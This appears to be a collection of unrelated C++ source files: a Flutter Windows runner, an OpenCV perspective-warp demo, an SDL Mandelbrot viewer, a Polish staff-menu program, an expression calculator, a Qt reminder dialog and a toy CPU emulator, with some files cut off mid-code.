    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"expansion_panel\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"utils.h\"\n\n#include <flutter_windows.h>\n#include <io.h>\n#include <stdio.h>\n#include <windows.h>\n\n#include <iostream>\n\nvoid CreateAndAttachConsole() {\n  if (::AllocConsole()) {\n    FILE *unused;\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stdout)) {\n      _dup2(_fileno(stdout), 1);\n    }\n    if (freopen_s(&unused, \"CONOUT$\", \"w\", stderr)) {\n      _dup2(_fileno(stdout), 2);\n    }\n    std::ios::sync_with_stdio();\n    FlutterDesktopResyncOutputStreams();\n  }\n}\n\nstd::vector<std::string> GetCommandLineArguments() {\n  // Convert the UTF-16 command line arguments to UTF-8 for the Engine to use.\n  int argc;\n  wchar_t** argv = ::CommandLineToArgvW(::GetCommandLineW(), &argc);\n  if (argv == nullptr) {\n    return std::vector<std::string>();\n  }\n\n  std::vector<std::string> command_line_arguments;\n\n  // Skip the first argument as it's the binary name.\n  for (int i = 1; i < argc; i++) {\n    command_line_arguments.push_back(Utf8FromUtf16(argv[i]));\n  }\n\n  ::LocalFree(argv);\n\n  return command_line_arguments;\n}\n\nstd::string Utf8FromUtf16(const wchar_t* utf16_string) {\n  if (utf16_string == nullptr) {\n    return std::string();\n  }\n  int target_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      -1, nullptr, 0, nullptr, nullptr)\n    -1; // remove the trailing null character\n  int input_length = (int)wcslen(utf16_string);\n  std::string utf8_string;\n  if (target_length <= 0 || target_length > utf8_string.max_size()) {\n    return utf8_string;\n  }\n  utf8_string.resize(target_length);\n  int converted_length = ::WideCharToMultiByte(\n      CP_UTF8, WC_ERR_INVALID_CHARS, utf16_string,\n      input_length, utf8_string.data(), target_length, nullptr, nullptr);\n  if (converted_length == 0) {\n    return std::string();\n  }\n  return utf8_string;\n}\n",
    "#include \"opencv2/opencv.hpp\"\r\n#include <iostream>\r\n\r\nusing namespace cv;\r\nusing namespace std;\r\n\r\nvoid on_mouse_warp(int event, int x, int y, int flags, void* userdata);\r\n\r\nMat src;\r\nvector<Point2f> srcQuad(4);\r\nint cnt = 0;\r\n\r\nint main(void)\r\n{\r\n    while (true)\r\n    {\r\n        src = imread(\"img/card.bmp\");\r\n\r\n        if (src.empty())\r\n        {\r\n            cerr << \"Image load failed!\" << endl;\r\n            return -1;\r\n        }\r\n\r\n        namedWindow(\"src\");\r\n        setMouseCallback(\"src\", on_mouse_warp);\r\n        imshow(\"src\", src);\r\n\r\n        int key = waitKey(0);\r\n\r\n        if (key == 'c' || key == 'C')\r\n        {\r\n            destroyAllWindows();\r\n\r\n            Mat src_copy_point = src.clone();\r\n            imshow(\"src\", src_copy_point);\r\n\r\n            cnt = 0;\r\n\r\n            continue;\r\n        }\r\n        else\r\n        {\r\n            break;\r\n        }\r\n    }\r\n\r\n    return 0;\r\n}\r\n\r\nvoid on_mouse_warp(int event, int x, int y, int flags, void*)\r\n{\r\n    static Mat src_copy = src.clone();\r\n\r\n    if (event == EVENT_LBUTTONDOWN)\r\n    {\r\n        if (cnt == 0)\r\n        {\r\n            src_copy = src.clone();\r\n        }\r\n\r\n        if (cnt < 4)\r\n        {\r\n            srcQuad[cnt++] = Point2f(x, y);\r\n\r\n            circle(src_copy, Point(x, y), 5, Scalar(0, 0, 255), -1);\r\n            imshow(\"src\", src_copy);\r\n\r\n            if (cnt == 4)\r\n            {\r\n                for (int i = 0; i < srcQuad.size(); i++)\r\n                {\r\n                    cout << \"Point \" << i << \": (\" << srcQuad[i].x << \", \" << srcQuad[i].y << \")\" << endl;\r\n                }\r\n\r\n                int w = 200, h = 300;\r\n\r\n                vector<Point2f> dstQuad(4);\r\n                dstQuad[0] = Point2f(0, 0);\r\n                dstQuad[1] = Point2f(w - 1, 0);\r\n                dstQuad[2] = Point2f(w - 1, h - 1);\r\n                dstQuad[3] = Point2f(0, h - 1);\r\n\r\n                Mat pers = getPerspectiveTransform(srcQuad, dstQuad);\r\n\r\n                Mat dst;\r\n                warpPerspective(src, dst, pers, Size(w, h));\r\n\r\n                imshow(\"dst\", dst);\r\n            }\r\n        }\r\n    }\r\n}\r\n",
    "/*\r\nZaine Rehman\r\n1-3-2024 through 2-22-2024\r\n\r\nThe previous program worked but had very messy code\r\nI also want to implement SIMD and possibly multithreading\r\nAnd just make it better in general\r\n\r\nHAHA NEVERMIND IT IS NOW MANDELBROT\r\n*/\r\n\r\n#include <iostream>\r\n#include <thread>\r\n#include <chrono>\r\n#include <cmath>\r\n\r\n#include <SDL.h>\r\n#undef main // needed or else it breaks\r\n\r\n#ifdef __SSE2__\r\n\t#include <emmintrin.h>\r\n#else\r\n\t#error SSE2 not supported; speed will be limited\r\n#endif\r\n\r\n#ifdef __AVX__\r\n\t#include <immintrin.h>\r\n#else\r\n\t#warning AVX not supported; speed will be limited\r\n#endif\r\n\r\n#include \"specifications.hpp\"\r\n#include \"extras.hpp\"\r\n\r\nusing namespace ball;\r\n\r\nusing std::chrono::high_resolution_clock;\r\nusing std::chrono::duration_cast;\r\nusing std::chrono::duration;\r\n\r\nvoid doMandel(\r\n\tdouble startX, double startY, \r\n\tdouble endX, double endY, \r\n\tbool doEasy\r\n) {\r\n\tfor (uint32_t i = startX; i < endX; i += 1) {\r\n\t\tfor (uint32_t j = startY; j < endY; j += 1) {\r\n\t\t\tif (doEasy && (lastMandel[i][j] < fastRenderVal)) continue;\r\n\r\n\t\t\tdouble cr = mapToReal(j,SCREENWIDTH,-currentZoomFactor,currentZoomFactor);\r\n\t\t\tdouble ci = mapToImaginary(i,SCREENHEIGHT,-currentZoomFactor,currentZoomFactor);\r\n\r\n\t\t\tuint32_t n = findMandelbrot(screenCenter[0]+cr,screenCenter[1]+ci,maxIter);\r\n\r\n\t\t\tRGBA_t color {0,0,0,255};\r\n\r\n\t\t\tswitch (colorMethod) {\r\n\t\t\tcase 0:\r\n\t\t\t\tif (n < maxIter)\r\n\t\t\t\t\tcolor = HSVtoRGB(n/(maxIter/1.0) * 360, 100, 100);\r\n\t\t\t\tbreak;\r\n\t\t\tcase 1:\r\n\t\t\t\tcolor.R = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tcolor.G = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tcolor.B = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tbreak;\r\n\t\t\tcase 2:\r\n\t\t\t\tcolor.R = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tcolor.G = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tcolor.B = (uint8_t)((n/maxIter)*255);\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\t\t\t\r\n\r\n\t\t\t//uint8_t r = (uint8_t)((n/maxIter) * 255);\r\n\t\t\t//uint8_t g = (uint8_t)((n/maxIter) * 255);\r\n\t\t\t//uint8_t b = (uint8_t)((n/maxIter) * 255);\r\n\r\n\t\t\tPIXELS[i][j] = color;\r\n\t\t\tlastMandel[i][j] = n;\r\n\t\t}\r\n\t\t//if(i == SCREENHEIGHT / 2) break;\r\n\t}\r\n}\r\n\r\nint main() {\r\n\tsrand(time(0));\r\n\r\n\t// initialize SDL\r\n\tif(SDL_Init(SDL_INIT_VIDEO) < 0) {\r\n\t\t// honestly no idea why you would even get here\r\n\t\tstd::cout << \"SDL could not initialize! SDL_Error: \" << SDL_GetError() << std::endl;\r\n\t\treturn -1;\r\n\t}\r\n\tSDL_CreateWindowAndRenderer(SCREENWIDTH, SCREENHEIGHT, SDL_WINDOW_RESIZABLE, &WINDOW, &RENDERER);\r\n\tif (WINDOW == NULL) {\r\n\t\tstd::cout << \"Window could not be created! SDL_Error: \" << SDL_GetError() << std::endl;\r\n\t\treturn -1;\r\n\t}\r\n\tSURFACE = SDL_GetWindowSurface(WINDOW);\r\n\t\r\n\tSDL_SetWindowTitle(WINDOW,\"Mandelbrot\");\r\n\t//SDL_SetRenderDrawColor(RENDERER, 0, 0, 0, 0);\r\n\t//SDL_RenderClear(RENDERER);\r\n\r\n\t//SDL_SetSurfaceRLE(SURFACE,1);\r\n\r\n\tSDL_Event event;\r\n\tNeeded pixelRenderer {};\r\n\tclock_t timeNew = clock();\r\n\tclock_t timeOld = clock();\r\n\tdouble deltaTime = 0;\r\n\tuint32_t mouseX = 0, mouseY = 0;\r\n\tbool QUIT = false;\r\n\tbool newCalc = true;\r\n\tbool doEasy = false;\r\n\r\n\t/*\r\n\tSDL_SetRenderDrawColor(RENDERER,R,B,G,A);\r\n\tSDL_RenderDrawPoint(RENDERER,X,Y); // maybe i dont have to use this\r\n\tSDL_RenderPresent(R_RENDERER); // or this\r\n\tSDL_RenderClear(R_RENDERER);\r\n\t*/\r\n\t\r\n\twhile (!QUIT) {\r\n\t\t//SDL_RenderClear(RENDERER);\r\n\t\ttimeNew = clock();\r\n\t\tdeltaTime = timeNew - timeOld;\r\n\r\n\t\tSDL_PollEvent(&event);\r\n\t\tswitch (event.type) {\r\n\t\tcase SDL_QUIT:\r\n\t\t\tQUIT = true;\r\n\t\t\tbreak;\r\n\t\tcase SDL_KEYDOWN:\r\n\t\t\tswitch (event.key.keysym.sym) {\r\n\t\t\tcase SDLK_ESCAPE:\r\n\t\t\t\tQUIT = true;\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase SDLK_KP_1: // rainbow colored\r\n\t\t\t\tcolorMethod = 0;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tdoEasy = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_KP_2: // grayscale\r\n\t\t\t\tcolorMethod = 1;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tdoEasy = true;\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase SDLK_LEFT:\r\n\t\t\t\tscreenCenter[0] -= .1 * currentZoomFactor;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_RIGHT:\r\n\t\t\t\tscreenCenter[0] += .1 * currentZoomFactor;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_UP:\r\n\t\t\t\tscreenCenter[1] -= .1 * currentZoomFactor;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_DOWN:\r\n\t\t\t\tscreenCenter[1] += .1 * currentZoomFactor;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase SDLK_KP_PERIOD:\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tdoEasy = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_KP_0:\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\r\n\t\t\tcase SDLK_KP_MULTIPLY:\r\n\t\t\t\tmaxIter *= 1.5;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\t\t\tcase SDLK_KP_DIVIDE:\r\n\t\t\t\tmaxIter /= 1.5;\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tbreak;\r\n\t\t\t}\r\n\r\n\t\t//default: break;\r\n\r\n\t\tcase SDL_MOUSEBUTTONDOWN: break;\r\n\t\t\tif (event.button.button == SDL_BUTTON_LEFT) {\r\n\t\t\t\tscreenCenter[0] = event.motion.x;\r\n\t\t\t\tscreenCenter[1] = event.motion.y;\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\tcase SDL_MOUSEWHEEL:\r\n\t\t\tif (event.wheel.y > 0) {\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tcurrentZoomFactor *= .8;\r\n\t\t\t\tmaxIter += 1;\r\n\t\t\t} else {\r\n\t\t\t\tnewCalc = true;\r\n\t\t\t\tcurrentZoomFactor /= .8;\r\n\t\t\t\tmaxIter -= 1;\r\n\t\t\t}\r\n\t\t\tbreak;\r\n\t\t\tstd::cout \r\n\t\t\t\t<< '[' << mouseX << ',' << mouseY << ']'\r\n\t\t\t\t<< \": value=\" << lastMandel[mouseY][mouseX]\r\n\t\t\t\t<<'\\n';\r\n\t\t\tbreak;\r\n\t\t}\r\n\t\t\r\n\t\tif (SDL_MUSTLOCK(SURFACE)) SD",
    "#include \"zad2+3.hpp\"\n\nusing namespace std;\n\nvoid dodaj() {\n\tcout << endl << endl;\n\tchar cont;\n\tdo {\n\t\tcout << \"Dodaj pracownika:\" << endl;\n\t\tint id = pracownicy.size() + 1;\n\n\t\tStanowisko Stanowisko;\n\t\t{\n\t\t\tint tmp;\n\t\t\tcout << \"\\t(0) Nauczyciel, (1) Dyrektor, (2) Sekretarka, (3) Wychowawca\" << endl;\n\t\t\tcout << \"\\tPodaj stanowisko: \";\n\t\t\tcin >> tmp;\n\t\t\tStanowisko = (enum Stanowisko)tmp;\n\t\t}\n\n\t\tstring imie, nazwisko;\n\t\tdouble stawka;\n\t\tint godziny;\n\n\t\tcout << \"\\tPodaj imi\u0119: \";\n\t\tcin >> imie;\n\n\t\tcout << \"\\tPodaj nazwisko: \";\n\t\tcin >> nazwisko;\n\n\t\tcout << \"\\tPodaj stawk\u0119: \";\n\t\tcin >> stawka;\n\n\t\tcout << \"\\tPodaj ilo\u015b\u0107 godzin: \";\n\t\tcin >> godziny;\n\n\t\tPracownikSzkoly pracownik(id, imie, nazwisko, stawka, godziny, Stanowisko);\n\t\tpracownicy.push_back(pracownik);\n\t\tcout << endl << \"Pracownik dodany...\" << endl << endl;\n\n\t\tcout << \"Czy chcesz doda\u0107 kolejnego pracownika? (t/n): \";\n\t\tcin >> cont;\n\t} while (cont == 't' || cont == 'T');\n}\nvoid usun() {\n\tcout << endl << endl;\n\tchar cont;\n\tdo {\n\t\tcout << \"Usu\u0144 pracownika:\" << endl;\n\n\t\tint id;\n\t\tcout << \"\\tPodaj id pracownika do usuni\u0119cia: \";\n\t\tcin >> id;\n\n\t\tcout << endl;\n\n\t\tauto it = znajdz(id);\n\t\tif (it != pracownicy.end()) {\n\t\t\tpracownicy.erase(it);\n\t\t\tcout << \"Pracownik usuni\u0119ty...\";\n\t\t} else {\n\t\t\tcout << \"Pracownik nie istnieje...\";\n\t\t}\n\n\t\tcout << endl << endl << \"Czy chcesz usun\u0105\u0107 kolejnego pracownika? (t/n): \";\n\t\tcin >> cont;\n\t} while (cont == 't' || cont == 'T');\n}\nvoid wyswietl() {\n\tcout << endl << endl;\n\tcout << \"Pracownicy:\" << endl;\n\tfor (auto it = pracownicy.begin(); it != pracownicy.end(); it++) {\n\t\tit->print();\n\t\tcout << endl;\n\t}\n}\n\nint main() {\n\tsetlocale(LC_ALL, \"pl_PL.utf8\");\n\twhile (true) {\n\t\tcout << \"Menu:\" << endl;\n\t\tcout << \"\\t1. Dodaj pracownika\" << endl;\n\t\tcout << \"\\t2. Usu\u0144 pracownika\" << endl;\n\t\tcout << \"\\t3. Wy\u015bwietl pracownik\u00f3w\" << endl;\n\t\tcout << \"\\t4. Wyjd\u017a\" << endl;\n\t\tint wybor;\n\t\tcout << \"Wybierz opcj\u0119: \";\n\t\tcin >> wybor;\n\t\tswitch (wybor) {\n\t\tcase 1:\n\t\t\tdodaj();\n\t\t\tbreak;\n\t\tcase 2:\n\t\t\tusun();\n\t\t\tbreak;\n\t\tcase 3:\n\t\t\twyswietl();\n\t\t\tbreak;\n\t\tcase 4:\n\t\t\treturn 0;\n\t\t}\n\t}\n}",
    "#include <iostream>\r\n#include <stack>\r\n#include <string>\r\n#include <sstream>\r\n#include <cmath>\r\n\r\nusing namespace std;\r\n\r\nbool isOperator(char c) {\r\n\treturn c == '+' || c == '-' || c == '*' || c == '/' || c == '^' || c == 's' || c == 'c' || c == 't' || c == 'l' || c == 'q';\r\n}\r\n\r\nbool isDigit(char c) {\r\n\treturn c >= '0' && c <= '9';\r\n}\r\n\r\nbool isLeftParenthesis(char c) {\r\n\treturn c == '(';\r\n}\r\n\r\nbool isRightParenthesis(char c) {\r\n\treturn c == ')';\r\n}\r\n\r\nbool isWhiteSpace(char c) {\r\n\treturn c == ' ' || c == '\\t' || c == '\\n';\r\n}\r\n\r\nbool isInvalidChar(char c) {\r\n\treturn !isOperator(c) && !isDigit(c) && !isLeftParenthesis(c) && !isRightParenthesis(c) && !isWhiteSpace(c);\r\n}\r\n\r\nbool isOperatorHigherOrEqual(char op1, char op2) {\r\n\tif ((op1 == '*' || op1 == '/' || op1 == '^' || op1 == 's' || op1 == 'c' || op1 == 't' || op1 == 'l' || op1 == 'q') && (op2 == '+' || op2 == '-')) {\r\n\t\treturn true;\r\n\t}\r\n\tif ((op1 == '^' || op1 == 's' || op1 == 'c' || op1 == 't' || op1 == 'l' || op1 == 'q') && (op2 == '*' || op2 == '/')) {\r\n\t\treturn true;\r\n\t}\r\n\treturn false;\r\n}\r\n\r\ndouble calculate(double operand1, double operand2, char op) {\r\n\tswitch (op) {\r\n\t\tcase '+':\r\n\t\t\treturn operand1 + operand2;\r\n\t\tcase '-':\r\n\t\t\treturn operand1 - operand2;\r\n\t\tcase '*':\r\n\t\t\treturn operand1 * operand2;\r\n\t\tcase '/':\r\n\t\t\treturn operand1 / operand2;\r\n\t\tcase '^':\r\n\t\t\treturn pow(operand1, operand2);\r\n\t\tcase 's':\r\n\t\t\treturn sin(operand2 * M_PI / 180.0);\r\n\t\tcase 'c':\r\n\t\t\treturn cos(operand2 * M_PI / 180.0);\r\n\t\tcase 't':\r\n\t\t\treturn tan(operand2 * M_PI / 180.0);\r\n\t\tcase 'l':\r\n\t\t\treturn log(operand2);\r\n\t\tcase 'q':\r\n\t\t\treturn sqrt(operand2);\r\n\t}\r\n\treturn 0;\r\n}\r\n\r\nbool evaluate(string expr, double& result) {\r\n\tstack<double> operands;\r\n\tstack<char> operators;\r\n\tint i = 0;\r\n\tint len = expr.length();\r\n\twhile (i < len) {\r\n\t\tchar c = expr[i];\r\n\t\tif (isWhiteSpace(c)) {\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isInvalidChar(c)) {\r\n\t\t\treturn false;\r\n\r\n\t\t}\r\n\t\tif (isDigit(c)) {\r\n\t\t\tdouble operand;\r\n\t\t\tstringstream ss;\r\n\t\t\tss << c;\r\n\t\t\ti++;\r\n\t\t\twhile (i < len && (isDigit(expr[i]) || expr[i] == '.')) {\r\n\t\t\t\tss << expr[i];\r\n\t\t\t\ti++;\r\n\t\t\t}\r\n\t\t\tss >> operand;\r\n\t\t\toperands.push(operand);\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isOperator(c)) {\r\n\t\t\tif (c == '-' && (i == 0 || isOperator(expr[i - 1]) || isLeftParenthesis(expr[i - 1]))) {\r\n\t\t\t\tdouble operand;\r\n\t\t\t\tstringstream ss;\r\n\t\t\t\tss << '-';\r\n\t\t\t\ti++;\r\n\t\t\t\twhile (i < len && (isDigit(expr[i]) || expr[i] == '.')) {\r\n\t\t\t\t\tss << expr[i];\r\n\t\t\t\t\ti++;\r\n\t\t\t\t}\r\n\t\t\t\tss >> operand;\r\n\t\t\t\toperands.push(operand);\r\n\t\t\t\tcontinue;\r\n\t\t\t}\r\n\t\t\twhile (!operators.empty() && isOperatorHigherOrEqual(operators.top(), c)) {\r\n\t\t\t\tdouble operand2 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble operand1 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tchar op = operators.top();\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t}\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isLeftParenthesis(c)) {\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (isRightParenthesis(c)) {\r\n\t\t\tif (operators.empty()) {\r\n\t\t\t\treturn false;\r\n\t\t\t}\r\n\t\t\tchar op = operators.top();\r\n\t\t\twhile (!isLeftParenthesis(op)) {\r\n\t\t\t\tif (operators.empty()) {\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\tdouble operand2 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble operand1 = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tif (operators.empty()) {\r\n\t\t\t\t\treturn false;\r\n\t\t\t\t}\r\n\t\t\t\top = operators.top();\r\n\t\t\t}\r\n\t\t\toperators.pop();\r\n\t\t\tif (!operators.empty() && (operators.top() == 's' || operators.top() == 'c' || operators.top() == 't' || operators.top() == 'l' || operators.top() == 'q')) {\r\n\t\t\t\tchar op = operators.top();\r\n\t\t\t\toperators.pop();\r\n\t\t\t\tdouble operand = operands.top();\r\n\t\t\t\toperands.pop();\r\n\t\t\t\tdouble result = calculate(0, operand, op);\r\n\t\t\t\toperands.push(result);\r\n\t\t\t}\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\tif (c == 's' || c == 'c' || c == 't' || c == 'l' || c == 'q') {\r\n\t\t\toperators.push(c);\r\n\t\t\ti++;\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t}\r\n\twhile (!operators.empty()) {\r\n\t\tchar op = operators.top();\r\n\t\toperators.pop();\r\n\t\tif (isLeftParenthesis(op) || operands.empty()) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\tdouble operand2 = operands.top();\r\n\t\toperands.pop();\r\n\t\tif (operands.empty()) {\r\n\t\t\treturn false;\r\n\t\t}\r\n\t\tdouble operand1 = operands.top();\r\n\t\toperands.pop();\r\n\t\tdouble result = calculate(operand1, operand2, op);\r\n\t\toperands.push(result);\r\n\t}\r\n\tif (operands.empty()) {\r\n\t\treturn false;\r\n\t}\r\n\tresult = operands.top();\r\n\treturn true;\r\n}\r\n\r\nint main() {\r\n\tstring expr;\r\n\tcout << \"input an expression: \";\r\n\tgetline(cin, expr);\r\n\tdouble result;\r\n\tif (evaluate(expr, result)) {\r\n\t\tprintf(\"%lf\\n\", result);\r\n\t} else {\r\n\t\tcout << \"illegal expression!\" << endl;\r\n\t}\r\n    cout<<\"press any key to continue...\";\r\n    getchar();\r\n\treturn 0;\r\n}\r\n",
    "#include \"mzplan_win_client.h\"\n#include \"plantimer.h\"\n#include \"reminddialog.h\"\n#include \"ui_reminddialog.h\"\n\nRemindDialog::RemindDialog(QString title,QString content,QWidget *parent)\n    : QDialog(parent)\n    , ui(new Ui::RemindDialog)\n{\n    ui->setupUi(this);\n    //\u8bbe\u7f6e\u663e\u793a\u754c\u9762\n    setWindowModality(Qt::NonModal);//\u975e\u6a21\u6001\n    setWindowFlags(Qt::FramelessWindowHint|Qt::WindowStaysOnTopHint);//\u8bbe\u7f6e\u65e0\u8fb9\u6846\u548c\u7a97\u53e3\u603b\u5728\u6700\u4e0a\u5c42\n    //\u8bbe\u7f6e\u663e\u793a\u5185\u5bb9\n    this->ui->title->setText(title);\n    this->ui->content->setPlainText(content);\n    this->ui->time->setText(QDateTime::currentDateTime().toString());\n}\n\nRemindDialog::~RemindDialog()\n{\n    delete ui;\n}\n\nvoid RemindDialog::on_closeBtn_clicked()\n{\n    this->close();\n    //\u53d1\u51fa\u6d88\u606f\u8ba9plantimer\u5220\u9664\u81ea\u5df1\uff0c\u91ca\u653e\u81ea\u5df1\u7684\u7a7a\u95f4\n    PlanTimer::getInstance().removeremindDialog(this);\n}\n\nvoid RemindDialog::mouseDoubleClickEvent(QMouseEvent *event)\n{\n    Q_UNUSED(event);\n    //\u5207\u6362\u5230\u4e3b\u754c\u9762\n    MZPlan_Win_client::getInstance().show();\n    MZPlan_Win_client::getInstance().activateWindow();\n    //\u5220\u9664\u81ea\u5df1\n    this->close();\n    PlanTimer::getInstance().removeremindDialog(this);\n}\n\n",
    "#include \"cpu.h\"\n\n#include <iostream>\n\n\nCPU::CPU() {\n\treset();\n}\n\nvoid CPU::reset() {\n\n\tfor (int i = 0; i < 8; ++i) {\n\t\tregisters.arithmetic[i] = 0;\n\t\tregisters.comparison[i] = 0;\n\t\tregisters.address[i] = 0;\n\t}\n\tregisters.ip = 0;\n\tregisters.flags.halted = false;\n\n\tfor (int i = 0; i < 256; ++i) {\n\t\tmemory[i] = 0;\n\t}\n}\nint8_t* CPU::get_memory() {\n\treturn memory;\n}\n\nvoid CPU::jump_by_instruction(uint8_t number) {\n\tint counter = 0;\n\tif (number == 0) registers.ip = 0;\n\tfor (registers.ip = 0; registers.ip < 256; registers.ip++) {\n\t\tif (memory[registers.ip] == 0x00) {\n\t\t\t++counter;\n\t\t\tif (counter == number + 1) {\n\t\t\t\t++registers.ip;\n\t\t\t\treturn;\n\t\t\t}\n\t\t}\n\t}\n\tregisters.ip = 256;\n}\n\nvoid CPU::jmp_if(bool condition) {\n\tif (condition) {\n\t\tjump_by_instruction(memory[++registers.ip]);\n\t}\n\telse {\n\t\twhile (!get_memory()[registers.ip] == 0x00) ++registers.ip;\n\t}\n}\n\nvoid CPU::do_operation_of(char operator_) {\n\tint8_t result;\n\tregisters.ip++;\n\tuint8_t reg1 = memory[registers.ip];\n\tregisters.ip++;\n\tuint8_t reg2 = memory[registers.ip];\n\n\tswitch (operator_) {\n\tcase 'm':\n\t\tresult = reg2;\n\t\tbreak;\n\tcase '-':\n\t\tresult = reg1 - reg2;\n\t\tbreak;\n\n\tcase '+':\n\t\tresult = reg1 + reg2;\n\t\tbreak;\n\n\tcase '*':\n\t\tresult = reg1 * reg2;\n\t\tbreak;\n\n\tcase '/':\n\t\tresult = reg1 / reg2;\n\t\tbreak;\n\n\tcase '^':\n\t\tresult = reg1 ^ reg2;\n\t\tbreak;\n\n\tcase '&':\n\t\tresult = reg1 & reg2;\n\t\tbreak;\n\n\tcase '|':\n\t\tresult = reg1 | reg2;\n\t\tbreak;\n\tdefault:\n\t\tbreak;\n\t}\n\tregisters.arithmetic[reg1 - 1] = result;\n\tregisters.ip++;\n}\n\nvoid CPU::execute(uint8_t opcode) {\n\n\tif (registers.flags.halted) std::exit(0);\n\n\tswitch (opcode) {\n\tcase 0x00: // NOP\n\t\t++registers.ip;\n\t\tbreak;\n\n\tcase 0x01: { // MOV\n\t\tdo_operation_of('m');\n\t\tbreak;\n\t}\n\n\tcase 0x02: { // ADD\n\t\tdo_operation_of('+');\n\t\tbreak;\n\t}\n\n\tcase 0x03: { // SUB\n\t\tdo_operation_of('-');\n\t\tbreak;\n\t}\n\n\tcase 0x04: { // MULT\n\t\tdo_operation_of('*');\n\t\tbreak;\n\t}\n\tcase 0x05: { // DIV\n\t\tdo_operation_of('/');\n\t\tbreak;\n\t}\n\tcase 0x06: { // XOR\n\t\tdo_operation_of('^');\n\t\tbreak;\n\t}\n\tcase 0x07: { // OR\n\t\tdo_operation_of('|');\n\t\tbreak;\n\t}\n\tcase 0x08: { // AND\n\t\tdo_operation_of('&');\n\t\tbreak;\n\t}\n\n\tcase 0x09: {\n\t\tjump_by_instruction(memory[++registers.ip]);\n\t\tbreak;\n\t}\n\tcase 0xA: { // JEQ, JZ\n\t\tjmp_if(registers.flags.zero);\n\t\tbreak;\n\t}\n\tcase 0xB: { // JNE, JNZ\n\t\tjmp_if(!registers.flags.zero);\n\t\tbreak;\n\t}\n\tcase 0xC: { // JC\n\t\tjmp_if(registers.flags.carry);\n\t\tbreak;\n\t}\n\tcase 0xD: { // JNC\n\t\tjmp_if(!registers.flags.carry);\n\t\tbreak;\n\t}\n\tcase 0xE: { // JS\n\t\tjmp_if(registers.flags.sign == 1);\n\t\tbreak;\n\t}\n\tcase 0xF: { // JNS\n\t\tjmp_if(registers.flags.sign == -1);\n\t\tbreak;\n\t}\n\tcase 0x10: { // JP\n\t\tjmp_if(registers.flags.parity);\n\t\tbreak;\n\t}\n\tcase 0x11: { // JNP\n\t\tjmp_if(!registers.flags.parity);\n\t\tbreak;\n\t}\n\n\tcase 0x12: { // CMP\n\t\tregisters.ip++;\n\n\t\tif (registers.ip < 256 && memory[registers.ip] != 0x00) {\n\t\t\tint8_t reg1 = registers.arithmetic[get_memory()[registers.ip] - 1];\n\n\t\t\tregisters.ip++;\n\t\t\tif (registers.ip < 256 && memory[registers.ip] != 0x00) {\n\t\t\t\tint8_t reg2 = 